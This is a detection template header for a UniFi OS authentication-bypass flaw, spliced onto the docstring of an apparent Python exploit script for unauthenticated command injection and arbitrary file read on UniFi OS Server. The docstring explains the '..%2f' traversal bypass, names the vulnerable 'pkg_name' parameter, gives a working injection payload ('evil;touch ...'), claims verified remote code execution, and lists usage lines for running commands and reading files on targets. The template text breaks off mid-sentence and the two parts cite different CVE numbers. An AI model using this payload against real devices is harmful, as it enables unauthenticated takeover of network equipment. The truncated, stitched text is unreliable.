id: CVE-2026-34908

info:
  name: UniFi OS - Authentication Bypass via Path Traversal (..%2f)
  author: Boreas37
  severity: critical
  description: |
    UniFi OS devices are vulnerable to an Improper Access Control issue that
    lets a malicious actor with network access make unauthorized changes to
    the system. The nginx auth layer treats any request whose RAW URI starts
    with "/api/auth/validate-sso/" as public, but routes by the NORMALIZED URI
    (decodes %2f to "/" and collapses "../"). Encoding a traversal makes these
    diverge, granting unauthenticated access to internal "/proxy/<service>/"
    backends. A request reaching the internal package-update handler proves

    Unauthenticated attacker bypasses authentication to reach internal UniFi
    OS proxy endpoints and can make unauthorized system changes. Listed in

#!/usr/bin/env python3
"""
CVE-2026-34910 — UniFi OS Unauthenticated Command Injection RCE (CVSS 10.0)
CVE-2026-34909 — UniFi OS Path Traversal Arbitrary File Read (CVSS 10.0)

Affected: UniFi OS Server (all versions prior to Security Advisory Bulletin 064 fixes)
CWE-20 / CWE-22 · CISA KEV listed (actively exploited by Mirai-derived botnet)

The nginx auth layer treats any request whose RAW URI starts with
"/api/auth/validate-sso/" as public, but routes by the NORMALIZED URI
(decodes %2f to "/" and collapses "../"). Encoding a traversal makes these
diverge, granting unauthenticated access to internal "/proxy/<service>/"
backends. The internal package-update handler ("latest_package") then passes
the pkg_name parameter into a shell command built as:

    sudo systemctl stop <pkg_name>

without sanitisation. Injecting a semicolon ("evil;CMD") escapes the systemctl
command and executes CMD as the ucs-update user → unauthenticated RCE in a
single request.

The same traversal primitive against /app-assets/<svc>/<path> reads files
off disk (nginx alias misconfiguration) → CVE-2026-34909.

VERIFIED against real UniFi OS Server 5.0.6 (hieutq/unifi-os-server:5.0.6-amd64,
setup-completed): pkg_name=evil;touch /tmp/PWNED_34910&by_cmd=true created the
file on the target (RCE confirmed). Patched 5.1.21 returns HTTP 400.

Usage:
    python3 CVE-2026-34910.py <target> <command>            # RCE (34910)
    python3 CVE-2026-34910.py <target> --check              # auth-bypass probe
    python3 CVE-2026-34910.py <target> --read <path>        # file read (34909)

Examples:
    python3 CVE-2026-34910.py https://192.168.1.10:11443 "id > /tmp/out.txt"
    python3 CVE-2026-34910.py https://192.168.1.10:11443 --check
